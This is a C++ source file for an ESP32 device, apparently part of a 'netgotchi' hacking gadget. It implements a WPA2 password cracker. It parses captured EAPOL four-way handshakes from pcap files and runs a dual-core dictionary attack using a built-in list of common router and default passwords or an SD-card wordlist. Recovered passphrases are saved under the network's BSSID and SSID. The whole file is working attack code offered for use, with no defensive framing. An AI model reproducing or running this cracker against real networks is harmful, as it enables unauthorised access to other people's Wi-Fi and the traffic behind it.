#include "CrackCommand.h"
#include "../../core/FastWpaCrack.h"
#include <SD.h>
#include <Arduino.h>
#include <cstring>
#include <cstdio>

// ── Built-in wordlist ──────────────────────────────────────────

static const char* const kCrackPasswords[] = {
  "12345678",  "123456789", "1234567890", "11111111",  "00000000",
  "87654321",  "11223344",  "12344321",   "99999999",  "88888888",
  "55555555",  "12121212",  "13131313",   "10101010",  "98765432",
  "12341234",  "11112222",  "22222222",   "33333333",  "44444444",
  "66666666",  "77777777",  "01234567",   "20202020",  "19191919",
  "password",  "password1", "passw0rd",   "pass1234",  "password12",
  "password123","admin123", "admin1234",  "admin2020", "root1234",
  "master12",  "login123",  "access14",   "letmein1",  "trustno1",
  "welcome1",  "changeme",  "default1",   "guest1234", "user1234",
  "test1234",  "temp1234",  "pass12345",  "p@ssw0rd",  "p@ss1234",
  "qwerty123", "qwertyui",  "qwerty12",   "qwer1234",  "qwerasdf",
  "asdfghjk",  "asdf1234",  "zxcvbnm1",   "1234asdf",  "1234qwer",
  "1q2w3e4r",  "zaq12wsx",  "1qaz2wsx",   "qazwsx123", "!q2w3e4r",
  "wifi1234",  "wifi12345", "wlan1234",   "router12",  "netgear1",
  "linksys1",  "dlink1234", "tplink12",   "huawei12",  "modem123",
  "internet",  "wireless",  "network1",   "connect1",  "homewifi",
  "mywifi123", "wifiwifi",  "setup1234",  "broadband", "fiber123",
  "abc12345",  "abcd1234",  "1234abcd",   "aa123456",  "a1234567",
  "a1b2c3d4",  "aaa11111",  "xyz12345",   "system12",  "server12",
  "cisco123",  "ubnt1234",  "mikrotik",   "radius12",  "monitor1",
  "14141414",  "12345679",  "11111112",   "01020304",  "02468024",
  "13572468",  "10203040",  "11235813",   "31415926",  "27182818",
};
static constexpr int kCrackPasswordCount =
    (int)(sizeof(kCrackPasswords) / sizeof(kCrackPasswords[0]));

// ── PCAP helpers ──────────────────────────────────────────────

static const uint8_t kEapolSnapSig[8] = {0xAA,0xAA,0x03,0x00,0x00,0x00,0x88,0x8E};
static constexpr uint16_t kKiAck     = 0x0080;
static constexpr uint16_t kKiMic     = 0x0100;
static constexpr uint16_t kKiInstall = 0x0040;

static bool crackPcapRead32(File& f, uint32_t& v) {
    uint8_t b[4];
    if (f.read(b, 4) != 4) return false;
    v = (uint32_t)b[0]|((uint32_t)b[1]<<8)|((uint32_t)b[2]<<16)|((uint32_t)b[3]<<24);
    return true;
}

static int crackFindSnap(const uint8_t* frm, uint16_t len) {
    for (uint16_t i = 0; i + 8 <= len; i++) {
        bool ok = true;
        for (int k = 0; k < 8; k++) if (frm[i+k] != kEapolSnapSig[k]) { ok=false; break; }
        if (ok) return (int)i;
    }
    return -1;
}

static const uint8_t* crackParseEapolKey(const uint8_t* frm, uint16_t flen,
                                          const uint8_t** eapolOut, uint16_t* totalOut) {
    if (flen < 24) return nullptr;
    const uint16_t fc = (uint16_t)frm[0] | ((uint16_t)frm[1] << 8);
    if (((fc & 0x000C) >> 2) != 2) return nullptr;
    int snap = crackFindSnap(frm, flen);
    if (snap < 0 || (uint16_t)(snap + 9) >= flen) return nullptr;
    const uint8_t* eapol = frm + snap + 8;
    if (eapol[1] != 0x03) return nullptr;
    uint16_t eap_len = ((uint16_t)eapol[2] << 8) | eapol[3];
    uint16_t total   = 4 + eap_len;
    uint16_t avail   = flen - (uint16_t)(snap + 8);
    if (total < 97 || avail < 97) return nullptr;
    if (total > avail) total = avail;
    *eapolOut = eapol;
    *totalOut = total;
    return eapol + 4;
}

// Reason codes: 0=success 1=open failed 2=bad pcap magic
//               3=no M1   4=no M2 paired 5=no SSID
static bool crackParsePcap(const char* path, CrackHandshake& hs, int& reason) {
    reason = 0;
    memset(&hs, 0, sizeof(hs));
    File f = SD.open(path, FILE_READ);
    if (!f) { reason = 1; return false; }

    uint8_t gh[24];
    uint32_t linktype = 105;
    if (f.read(gh, 24) != 24) { f.close(); reason = 2; return false; }
    if (gh[0]==0xD4&&gh[1]==0xC3&&gh[2]==0xB2&&gh[3]==0xA1) {
        linktype = (uint32_t)gh[20]|((uint32_t)gh[21]<<8)|
                   ((uint32_t)gh[22]<<16)|((uint32_t)gh[23]<<24);
    } else {
        f.seek(0);
    }

    bool gotAnonce = false, gotM2 = false;
    uint8_t lastAnonce[32]={}, lastAp[6]={}, lastSta[6]={};
    bool pendM2=false;
    uint8_t pendSta[6]={}, pendAp[6]={}, pendSnonce[32]={}, pendMic[16]={};
    uint8_t pendEapol[300]={}; uint16_t pendEapolLen=0;
    uint8_t rec[512];

    while (f.available() > 16) {
        uint32_t ts,tu,incl,orig;
        if (!crackPcapRead32(f,ts)||!crackPcapRead32(f,tu)||
            !crackPcapRead32(f,incl)||!crackPcapRead32(f,orig)) break;
        if (!incl || incl > sizeof(rec)) { f.seek(f.position()+incl); continue; }
        if (f.read(rec, incl) != (int)incl) break;
        uint16_t off = 0;
        if (linktype == 127) {
            if (incl < 4) continue;
            off = (uint16_t)rec[2]|((uint16_t)rec[3]<<8);
            if (off >= incl) continue;
        }
        const uint8_t* frm  = rec + off;
        uint16_t       flen = (uint16_t)(incl - off);

        const uint16_t fc    = (uint16_t)frm[0]|((uint16_t)frm[1]<<8);
        const uint8_t  fcTyp = (fc & 0x000C) >> 2;
        const uint8_t  fcSub = (fc & 0x00F0) >> 4;
        if (fcTyp==0 && fcSub==8 && flen>=36 && hs.ssid[0]=='\0') {
            uint16_t pos = 36;
            while (pos + 2 <= flen) {
                uint8_t id=frm[pos], elen=frm[pos+1];
                if (pos+2+elen > flen) break;
                if (id==0 && elen>0 && elen<=32) {
                    memcpy(hs.ssid, frm+pos+2, elen); hs.ssid[elen]='\0';
                    hs.ssid_len=(uint8_t)elen; break;
                }
                pos += 2 + elen;
            }
            continue;
        }

        const uint8_t* eapol; uint16_t total;
        const uint8_t* key = crackParseEapolKey(frm, flen, &eapol, &total);
        if (!key) continue;
        uint16_t ki = ((uint16_t)key[1]<<8)|key[2];
        bool ack=ki&kKiAck, mic=ki&kKiMic, inst=ki&kKiInstall;

        if (ack && (!mic||inst)) {
            memcpy(lastAp, frm+10, 6); memcpy(lastSta, frm+4, 6);
            memcpy(lastAnonce, key+13, 32); gotAnonce=true;
            if (pendM2 && memcmp(pendSta,lastSta,6)==0 && memcmp(pendAp,lastAp,6)==0) {
                memcpy(hs.ap,lastAp,6); memcpy(hs.sta,lastSta,6);
                memcpy(hs.anonce,lastAnonce,32); memcpy(hs.snonce,pendSnonce,32);
                memcpy(hs.mic,pendMic,16);
                if (pendEapolLen<=sizeof(hs.eapol)) {
                    memcpy(hs.eapol,pendEapol,pendEapolLen);
                    memset(hs.eapol+81,0,16); hs.eapol_len=pendEapolLen;
                }
                gotM2=true;
            }
        } else if (!ack && mic && !inst) {
            bool nonceZero=true;
            for (int z=0;z<32&&nonceZero;z++) nonceZero=(key[13+z]==0);
            if (nonceZero) continue;
            if (gotAnonce && memcmp(frm+10,lastSta,6)==0 && memcmp(frm+4,lastAp,6)==0) {
                memcpy(hs.ap,lastAp,6); memcpy(hs.sta,lastSta,6);
                memcpy(hs.anonce,lastAnonce,32); memcpy(hs.snonce,key+13,32);
                memcpy(hs.mic,eapol+81,16);
                if (total<=sizeof(hs.eapol)) {
                    memcpy(hs.eapol,eapol,total);
                    memset(hs.eapol+81,0,16); hs.eapol_len=total;
                }
                gotM2=true;
            } else {
                pendM2=true;
                memcpy(pendSta,frm+10,6); memcpy(pendAp,frm+4,6);
                memcpy(pendSnonce,key+13,32); memcpy(pendMic,eapol+81,16);
                if (total<=sizeof(pendEapol)) {
                    memcpy(pendEapol,eapol,total);
                    memset(pendEapol+81,0,16); pendEapolLen=total;
                }
            }
        }
    }
    f.close();
    if (!gotM2) { reason = gotAnonce ? 4 : 3; return false; }

    if (hs.ssid[0]=='\0') {
        const char* sl=strrchr(path,'/');
        const char* us=strchr(sl?sl+1:path,'_');
        const char* dt=strrchr(path,'.');
        if (us && dt && dt>us+1) {
            int n=(int)(dt-us-1); if (n>32) n=32;
            memcpy(hs.ssid, us+1, n); hs.ssid[n]='\0';
            hs.ssid_len=(uint8_t)n;
        }
        if (hs.ssid[0]=='\0') { reason = 5; return false; }
    }

    uint8_t* p=hs.prf_data;
    if (memcmp(hs.ap,hs.sta,6)<0) { memcpy(p,hs.ap,6);p+=6;memcpy(p,hs.sta,6);p+=6; }
    else                           { memcpy(p,hs.sta,6);p+=6;memcpy(p,hs.ap,6);p+=6;  }
    if (memcmp(hs.anonce,hs.snonce,32)<0) {
        memcpy(p,hs.anonce,32);p+=32;memcpy(p,hs.snonce,32);
    } else {
        memcpy(p,hs.snonce,32);p+=32;memcpy(p,hs.anonce,32);
    }
    return true;
}

// ── Sub-menu ──────────────────────────────────────────────────

void CrackCommand::execute(IMenuHost& host) {
    if (!_pcapLoaded || _subState == kDict) {
        _loadPcapList();
        _pcapLoaded = true;
    }
    _subState = kPcap;
    host.openSubMenu(this);
}

int CrackCommand::subCount() const {
    if (_subState == kPcap) return _fileCount + 1;
    return _fileCount + 2;
}

const char* CrackCommand::subLabel(int idx) const {
    if (_subState == kPcap) {
        if (idx < _fileCount) return _fileNames[idx];
        return "back";
    }
    if (idx < _fileCount) return _fileNames[idx];
    if (idx == _fileCount) return "built in";
    return "back";
}

const char* CrackCommand::inputHint() const {
    if (_subState == kPcap) {
        strncpy(_hint, "crack", sizeof(_hint) - 1);
    } else {
        snprintf(_hint, sizeof(_hint), "crack %.42s", _basename(_selPcap));
    }
    return _hint;
}

void CrackCommand::onSubSelect(IMenuHost& host, int idx) {
    if (_subState == kPcap) {
        if (idx < _fileCount) {
            strncpy(_selPcap, _filePaths[idx], sizeof(_selPcap) - 1);
            _loadDictList();
            _subState = kDict;
        } else {
            host.menuBack();
        }
        return;
    }

    const char* dictPath = nullptr;
    const char* dictName = nullptr;
    if (idx < _fileCount) {
        dictPath = _filePaths[idx];
        dictName = _basename(_filePaths[idx]);
    } else if (idx == _fileCount) {
        dictPath = "builtin";
        dictName = "builtin";
    } else {
        _pcapLoaded = false;
        _subState = kPcap;
        return;
    }

    char cmd[52];
    snprintf(cmd, sizeof(cmd), "crack %.24s %.20s", _basename(_selPcap), dictName);
    host.cmdPush(cmd);

    strncpy(_crackPcapPath, _selPcap, sizeof(_crackPcapPath) - 1);
    strncpy(_crackCtx.wordlistPath, dictPath, sizeof(_crackCtx.wordlistPath) - 1);
    host.menuClose();
    _pendingStart = true;
}

void CrackCommand::_loadPcapList() {
    _fileCount = 0;
    File dir = SD.open("/netgotchi/eapol");
    if (!dir) return;
    File f = dir.openNextFile();
    while (f && _fileCount < MAX_FILES) {
        if (!f.isDirectory()) {
            const char* full = f.name();
            const char* base = strrchr(full, '/');
            base = base ? base + 1 : full;
            int nl = (int)strlen(base);
            if (nl >= 5 && strcmp(base + nl - 5, ".pcap") == 0) {
                snprintf(_filePaths[_fileCount], 64, "/netgotchi/eapol/%s", base);
                snprintf(_fileNames[_fileCount], 32, "%.31s", base);
                _fileCount++;
            }
        }
        f.close();
        f = dir.openNextFile();
    }
    if (f) f.close();
    dir.close();
}

void CrackCommand::_loadDictList() {
    _fileCount = 0;
    File dir = SD.open("/netgotchi/dictionaries");
    if (!dir) return;
    File f = dir.openNextFile();
    while (f && _fileCount < MAX_FILES) {
        if (!f.isDirectory()) {
            const char* full = f.name();
            const char* base = strrchr(full, '/');
            base = base ? base + 1 : full;
            snprintf(_filePaths[_fileCount], 64, "/netgotchi/dictionaries/%s", base);
            snprintf(_fileNames[_fileCount], 32, "%.31s", base);
            _fileCount++;
        }
        f.close();
        f = dir.openNextFile();
    }
    if (f) f.close();
    dir.close();
}

// ── Crack engine ──────────────────────────────────────────────

void CrackCommand::stop() {
    _crackCtx.stop = true;
}

// Worker: drains queue, runs all crypto
__attribute__((section(".iram1.text")))
void CrackCommand::_crackWorkerTask(void* param) {
    CrackCtx* ctx = static_cast<CrackCtx*>(param);
    int core = (int)xPortGetCoreID();

    CrackPwEntry entry;
    while (true) {
        if (xQueueReceive(ctx->queue, &entry, portMAX_DELAY) != pdTRUE) break;
        if (entry.len == 0) break;
        if (!ctx->found && !ctx->stop) {
            bool hit = fast_wpa2_try_password(entry.pw, entry.len,
                                               ctx->hs.ssid, ctx->hs.ssid_len,
                                               ctx->hs.prf_data, ctx->hs.eapol,
                                               ctx->hs.eapol_len, ctx->hs.mic);
            if (hit) { ctx->found = true; memcpy(ctx->foundPass, entry.pw, entry.len + 1); }
        }
        __atomic_fetch_add(&ctx->tested, 1, __ATOMIC_RELAXED);
        // Core 0 has no Arduino loop — IDLE task never runs unless we yield.
        // Without this yield the Task Watchdog fires after ~5s.
        if (core == 0) vTaskDelay(pdMS_TO_TICKS(1));
    }
    xSemaphoreGive(ctx->doneSem);
    vTaskDelete(NULL);
}

// Producer (core 0): reads wordlist, fills queue — no crypto here
__attribute__((section(".iram1.text")))
void CrackCommand::_crackProdTask(void* param) {
    CrackCtx* ctx = static_cast<CrackCtx*>(param);

    auto enqueue = [&](const char* pw, uint8_t len) {
        CrackPwEntry entry;
        memcpy(entry.pw, pw, len + 1);
        entry.len = len;
        while (!ctx->stop && !ctx->found) {
            if (xQueueSend(ctx->queue, &entry, pdMS_TO_TICKS(10)) == pdTRUE) break;
        }
    };

    if (strcmp(ctx->wordlistPath, "builtin") == 0) {
        for (int i = 0; i < kCrackPasswordCount && !ctx->stop && !ctx->found; i++) {
            enqueue(kCrackPasswords[i], (uint8_t)strlen(kCrackPasswords[i]));
            ctx->bytesDone = (uint32_t)(i + 1);
        }
    } else {
        char line[64];
        File f = SD.open(ctx->wordlistPath, FILE_READ);
        if (f) {
            ctx->fileSize = (uint32_t)f.size();
            while (f.available() && !ctx->stop && !ctx->found) {
                size_t n = f.readBytesUntil('\n', line, 63);
                line[n] = '\0';
                while (n > 0 && (line[n-1] == '\r' || line[n-1] == '\n')) line[--n] = '\0';
                ctx->bytesDone = (uint32_t)f.position();
                if (n < 8 || n > 63) continue;
                enqueue(line, (uint8_t)n);
            }
            f.close();
        }
    }

    // one poison pill per worker
    for (int i = 0; i < 2; i++) {
        CrackPwEntry poison; memset(&poison, 0, sizeof(poison));
        xQueueSend(ctx->queue, &poison, portMAX_DELAY);
    }
    // wait for both workers to finish
    xSemaphoreTake(ctx->doneSem, portMAX_DELAY);
    xSemaphoreTake(ctx->doneSem, portMAX_DELAY);
    ctx->done = true;
    vTaskDelete(nullptr);
}

void CrackCommand::_startCrack(IMenuHost& host) {
    CrackHandshake hs;
    int reason = 0;
    if (!crackParsePcap(_crackPcapPath, hs, reason)) {
        const char* msg;
        switch (reason) {
            case 1:  msg = "open failed";     break;
            case 2:  msg = "bad pcap header"; break;
            case 3:  msg = "no M1 in pcap";   break;
            case 4:  msg = "no M2 paired";    break;
            case 5:  msg = "no SSID in pcap"; break;
            default: msg = "parse failed";    break;
        }
        char buf[32];
        snprintf(buf, sizeof(buf), "handshake %s", msg);
        host.outPush(buf);
        return;
    }

    char buf[48];
    snprintf(buf, sizeof(buf), "target: %.32s", hs.ssid);
    host.outPush(buf);

    char wlPath[64];
    strncpy(wlPath, _crackCtx.wordlistPath, sizeof(wlPath) - 1);
    wlPath[sizeof(wlPath)-1] = '\0';

    memset(&_crackCtx, 0, sizeof(_crackCtx));
    _crackCtx.hs = hs;
    strncpy(_crackCtx.wordlistPath, wlPath, sizeof(_crackCtx.wordlistPath) - 1);

    if (strcmp(_crackCtx.wordlistPath, "builtin") == 0) {
        _crackCtx.fileSize = (uint32_t)kCrackPasswordCount;
    }

    // Counting semaphore: workers give it, producer waits twice
    _crackCtx.queue   = xQueueCreate(CRACK_QUEUE_DEPTH, sizeof(CrackPwEntry));
    _crackCtx.doneSem = xSemaphoreCreateCounting(2, 0);

    // core 0 worker: priority 5, full speed (no main loop on core 0)
    // core 1 worker: priority 1, time-slices fairly with main loop — no lag
    xTaskCreatePinnedToCore(_crackWorkerTask, "wpa2_w0", 16384, &_crackCtx, 5,
                            &_crackCtx.workerHandles[0], 0);
    xTaskCreatePinnedToCore(_crackWorkerTask, "wpa2_w1", 16384, &_crackCtx, 1,
                            &_crackCtx.workerHandles[1], 1);
    xTaskCreatePinnedToCore(_crackProdTask,   "wpa2_p",  16384, &_crackCtx, 4,
                            &_crackProdHandle, 0);

    _crackStartMs = millis();
    _crackState   = CrackState::Running;
}

void CrackCommand::update(IMenuHost& host, uint32_t ms) {
    (void)ms;
    if (_pendingStart && host.typingIdle()) {
        _pendingStart = false;
        _startCrack(host);
        return;
    }
    if (_crackState != CrackState::Running) return;
    if (!_crackCtx.done) return;

    _crackProdHandle = nullptr;
    _crackCtx.workerHandles[0] = nullptr;
    _crackCtx.workerHandles[1] = nullptr;
    if (_crackCtx.queue)   { vQueueDelete(_crackCtx.queue);       _crackCtx.queue   = nullptr; }
    if (_crackCtx.doneSem) { vSemaphoreDelete(_crackCtx.doneSem); _crackCtx.doneSem = nullptr; }

    char buf[48];
    if (_crackCtx.found) {
        char savePath[80];
        char bssid[13];
        snprintf(bssid, sizeof(bssid), "%02X%02X%02X%02X%02X%02X",
                 _crackCtx.hs.ap[0], _crackCtx.hs.ap[1], _crackCtx.hs.ap[2],
                 _crackCtx.hs.ap[3], _crackCtx.hs.ap[4], _crackCtx.hs.ap[5]);
        SD.mkdir("/netgotchi/cracked");
        snprintf(savePath, sizeof(savePath), "/netgotchi/cracked/%.12s_%.32s.pass",
                 bssid, _crackCtx.hs.ssid);
        File pf = SD.open(savePath, FILE_WRITE);
        if (pf) { pf.print(_crackCtx.foundPass); pf.close(); }
        snprintf(buf, sizeof(buf), "ssid: %.32s", _crackCtx.hs.ssid);
        host.outPush(buf);
        snprintf(buf, sizeof(buf), "pass: %.32s", _crackCtx.foundPass);
        host.outPush(buf);
    } else if (_crackCtx.stop) {
        host.outPush("interrupted");
    } else {
        host.outPush("not found");
    }
    _crackState = CrackState::Idle;
}
